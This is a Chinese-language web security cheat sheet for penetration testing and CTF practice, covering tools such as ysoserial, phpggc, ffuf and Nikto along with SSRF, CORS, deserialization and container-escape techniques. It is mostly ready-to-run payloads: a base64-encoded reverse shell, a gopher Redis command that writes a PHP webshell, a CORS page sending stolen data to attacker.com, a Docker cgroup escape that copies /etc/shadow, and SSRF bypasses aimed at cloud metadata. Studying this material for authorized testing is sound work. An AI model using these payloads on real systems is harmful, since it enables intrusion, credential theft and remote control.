# 其他Web工具

其他常用的Web安全测试工具和技术。

## 在线工具

### Web安全扫描器

| 工具名称 | 链接 | 特点 |
|---------|------|------|
| OWASP ZAP | [https://www.zaproxy.org/](https://www.zaproxy.org/) | 开源免费，自动扫描 |
| Nikto | 命令行工具 | Web服务器扫描 |

### SSRF测试工具

| 工具名称 | 链接 | 功能 |
|---------|------|------|
| Webhook.site | [https://webhook.site/](https://webhook.site/) | 接收HTTP请求 |
| RequestBin | [https://requestbin.com/](https://requestbin.com/) | HTTP请求收集 |
| DNSLog | [http://dnslog.cn/](http://dnslog.cn/) | DNS外带平台 |
| Burp Collaborator | Burp内置 | 专业外带平台 |

### 反序列化工具

| 工具名称 | 链接 | 语言 |
|---------|------|------|
| ysoserial | [GitHub](https://github.com/frohoff/ysoserial) | Java |
| phpggc | [GitHub](https://github.com/ambionics/phpggc) | PHP |

## 离线工具

### OWASP ZAP

**下载链接**:
```
https://www.zaproxy.org/download/
```

**功能**: 开源Web应用安全扫描器

**基本使用**:
```
1. 启动ZAP
2. 配置浏览器代理: 127.0.0.1:8080
3. 浏览目标网站
4. Scan -> Active Scan
5. 查看Alerts
```

**特点**:
- 完全免费开源
- 自动/手动测试
- API支持
- 插件扩展
- 适合CI/CD集成

### ysoserial

**下载链接**:
```
https://github.com/frohoff/ysoserial
```

**安装使用**:
```bash
# 下载
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package

# 使用预编译版
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 列出所有Gadget
java -jar ysoserial-all.jar

# 生成Payload
java -jar ysoserial-all.jar CommonsCollections1 "calc.exe" > payload.bin
java -jar ysoserial-all.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" | base64
```

**常用Gadget链**:
```
CommonsCollections1-7  # Apache Commons Collections
Spring1-2              # Spring Framework
Jdk7u21                # JDK原生
ROME                   # Rome RSS
JSON1                  # JSON库
Groovy1                # Groovy
```

### phpggc

**下载链接**:
```
https://github.com/ambionics/phpggc
```

**安装使用**:
```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# 列出所有Gadget
./phpggc -l

# 生成Payload
./phpggc Monolog/RCE1 system id
./phpggc Laravel/RCE1 system whoami

# Base64编码
./phpggc -b Monolog/RCE1 system id

# 序列化格式
./phpggc -s Laravel/RCE1 system id

# URL编码
./phpggc -u Symfony/RCE4 system whoami
```

**常用框架Gadget**:
```
Laravel          # Laravel框架
Symfony          # Symfony框架
Monolog          # Monolog日志库
Doctrine         # Doctrine ORM
Guzzle           # Guzzle HTTP客户端
SwiftMailer      # SwiftMailer邮件库
```

### Nikto

**安装使用**:
```bash
# Kali预装
nikto -h

# 手动安装
git clone https://github.com/sullo/nikto
cd nikto/program
perl nikto.pl

# 基本扫描
nikto -h http://target.com

# 指定端口
nikto -h http://target.com -p 80,443,8080

# 使用代理
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# 保存结果
nikto -h http://target.com -o report.html -Format html
```

**功能**:
- Web服务器扫描
- CGI漏洞检测
- 过期软件识别
- 配置错误检查

### ffuf

**下载链接**:
```
https://github.com/ffuf/ffuf
```

**安装使用**:
```bash
# Go安装
go install github.com/ffuf/ffuf@latest

# 基本目录扫描
ffuf -u http://target.com/FUZZ -w wordlist.txt

# 子域名爆破
ffuf -u http://FUZZ.target.com/ -w subdomains.txt

# POST参数Fuzz
ffuf -u http://target.com/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt

# 过滤响应
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404  # 过滤404
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 0    # 过滤大小为0
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200  # 只显示200

# 多线程
ffuf -u http://target.com/FUZZ -w wordlist.txt -t 50

# 递归扫描
ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2
```

### wfuzz

**安装使用**:
```bash
pip install wfuzz

# 目录扫描
wfuzz -w wordlist.txt http://target.com/FUZZ

# 参数Fuzz
wfuzz -z range,1-100 http://target.com/page?id=FUZZ

# POST数据Fuzz
wfuzz -z file,wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login

# Cookie Fuzz
wfuzz -z file,wordlist.txt -b "session=FUZZ" http://target.com/admin

# 过滤
wfuzz -w wordlist.txt --hc 404 http://target.com/FUZZ  # 隐藏404
wfuzz -w wordlist.txt --sc 200 http://target.com/FUZZ  # 只显示200
```

## SSRF攻击

### 常用Bypass技巧

**IP绕过**:
```
# 127.0.0.1的各种形式
http://127.0.0.1/
http://localhost/
http://127.1/
http://127.0.1/
http://0.0.0.0/
http://0/

# 十进制IP
http://2130706433/  # 127.0.0.1

# 十六进制IP
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/

# 八进制IP
http://0177.0.0.1/

# 混合编码
http://0x7f.0.0.1/
```

**DNS Rebinding**:
```
http://A.B.C.D.xip.io/
http://A.B.C.D.nip.io/
http://A.B.C.D.sslip.io/
```

**URL解析绕过**:
```
http://example.com@127.0.0.1/
http://127.0.0.1#example.com
http://example.com#@127.0.0.1/
```

**重定向绕过**:
```python
# redirect.php
<?php
header("Location: http://127.0.0.1/");
?>
```

**协议利用**:
```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_SET key value
```

### Gopher协议攻击

**Redis未授权访问**:
```bash
# Gopher协议格式
gopher://127.0.0.1:6379/_<URLencoded commands>

# 写入Webshell
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0d%0a<?php eval($_POST['cmd']);?>%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**FastCGI攻击**:
```
gopher://127.0.0.1:9000/_<FastCGI payload>
```

## 反序列化漏洞

### PHP反序列化

**基本概念**:
```php
// 序列化
$obj = new User("admin");
$serialized = serialize($obj);
// O:4:"User":1:{s:4:"name";s:5:"admin";}

// 反序列化
$obj = unserialize($serialized);
```

**魔术方法**:
```php
__wakeup()      # unserialize时调用
__destruct()    # 对象销毁时调用
__toString()    # 对象被当作字符串时调用
__call()        # 调用不存在的方法时调用
__get()         # 访问不存在的属性时调用
```

**Phar反序列化**:
```php
// 文件操作函数触发
file_exists('phar://shell.phar/test.txt')
file_get_contents('phar://shell.phar/test.txt')
is_dir('phar://shell.phar/test')
```

### Java反序列化

**检测方法**:
```
1. 查看Content-Type: application/x-java-serialized-object
2. 数据开头: \xac\xed\x00\x05 (rO0AB in Base64)
3. 抓包看到序列化类名
```

**利用流程**:
```bash
# 1. 识别依赖库和版本
# 2. 选择合适的Gadget链
# 3. 生成Payload
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaA==}|{base64,-d}|{bash,-i}" | base64

# 4. 发送Payload
```

**常见库漏洞**:
```
Commons Collections 3.1-3.2.1
Spring Framework < 4.2.4
Fastjson < 1.2.68
Jackson
XStream
```

## CORS跨域攻击

### 检测方法

```http
# 请求
Origin: http://evil.com

# 响应
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Credentials: true
```

### 攻击示例

```html
<!-- evil.html -->
<script>
fetch('http://target.com/api/user', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // 发送到攻击者服务器
  fetch('http://attacker.com/?data=' + JSON.stringify(data));
});
</script>
```

## WebSocket安全

### 常见漏洞

```javascript
// 1. 认证绕过
ws://target.com/ws?token=invalid

// 2. XSS
ws.send('{"msg":"<script>alert(1)</script>"}')

// 3. SQL注入
ws.send('{"id":"1\' OR 1=1--"}')

// 4. CSTI
ws.send('{"template":"{{7*7}}"}')
```

### 测试工具

```javascript
// 浏览器控制台测试
var ws = new WebSocket('ws://target.com/ws');
ws.onopen = function() {
  ws.send('test');
};
ws.onmessage = function(e) {
  console.log(e.data);
};
```

## GraphQL安全

### 信息泄露

```graphql
# Introspection查询
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# 查询所有用户
{
  users {
    id
    username
    email
    password
  }
}
```

### 注入攻击

```graphql
# SQL注入
{
  user(id: "1' OR '1'='1") {
    username
  }
}

# NoSQL注入
{
  user(id: {$ne: null}) {
    username
  }
}
```

## 容器逃逸

### Docker信息收集

```bash
# 检查是否在容器中
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# 查看容器权限
capsh --print

# 挂载点
mount | grep docker
```

### 逃逸技巧

```bash
# 特权容器逃逸
# --privileged启动的容器
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## CTF解题技巧

!!! tip "信息收集"
    ```
    - robots.txt
    - .git/ .svn/ 泄露
    - 备份文件 (.bak, .swp, ~, .old)
    - 源码注释
    - HTTP响应头
    - phpinfo()
    - 目录扫描
    ```

!!! tip "常见考点组合"
    ```
    - 文件上传 + 文件包含 → Getshell
    - SSRF + Redis → RCE
    - SSRF + FastCGI → RCE
    - XXE + SSRF → 内网探测
    - SQL注入 + INTO OUTFILE → Webshell
    - 反序列化 + POP链 → RCE
    - SSTI + Payload → RCE
    - JWT伪造 + 权限提升
    ```

!!! tip "快速测试"
    ```bash
    # 1. 目录扫描
    ffuf -u http://target.com/FUZZ -w wordlist.txt
    
    # 2. 参数Fuzz
    wfuzz -z file,wordlist.txt http://target.com/?id=FUZZ
    
    # 3. SQL注入
    sqlmap -u "http://target.com/?id=1" --batch
    
    # 4. XSS测试
    <script>alert(1)</script>
    
    # 5. 命令注入
    ; whoami
    | whoami
    
    # 6. 文件包含
    ?file=../../../etc/passwd
    ?file=php://filter/read=convert.base64-encode/resource=index.php
    ```

!!! warning "反序列化注意事项"
    - **Java**: 查找ysoserial的Gadget链
    - **PHP**: 构造POP链，注意魔术方法
    - **Python**: pickle反序列化，__reduce__方法
    - **版本匹配**: 确保Gadget链版本与目标匹配
    - **Base64编码**: 很多情况下需要Base64编码传输

!!! tip "SSRF利用技巧"
    ```
    # 内网探测
    http://127.0.0.1/
    http://192.168.1.1/
    
    # 端口扫描
    http://127.0.0.1:6379/
    http://127.0.0.1:9000/
    
    # 云服务元数据
    http://169.254.169.254/latest/meta-data/
    
    # Redis利用
    gopher://127.0.0.1:6379/_...
    
    # FastCGI利用
    gopher://127.0.0.1:9000/_...
    ```

!!! tip "工具使用建议"
    ```
    目录扫描: ffuf / dirsearch / dirb
    参数Fuzz: wfuzz / ffuf
    SQL注入: SQLMap
    反序列化: ysoserial (Java) / phpggc (PHP)
    流量分析: Burp Suite / OWASP ZAP
    自动扫描: Nikto / OWASP ZAP
    ```

## 相关资源

- **OWASP ZAP**: 开源免费的Web安全扫描器
- **ysoserial**: Java反序列化利用工具
- **phpggc**: PHP反序列化Gadget链生成器
- **ffuf**: 高速Fuzzing工具
- **PayloadsAllTheThings**: 各类漏洞Payload集合
- **Nikto**: Web服务器扫描器
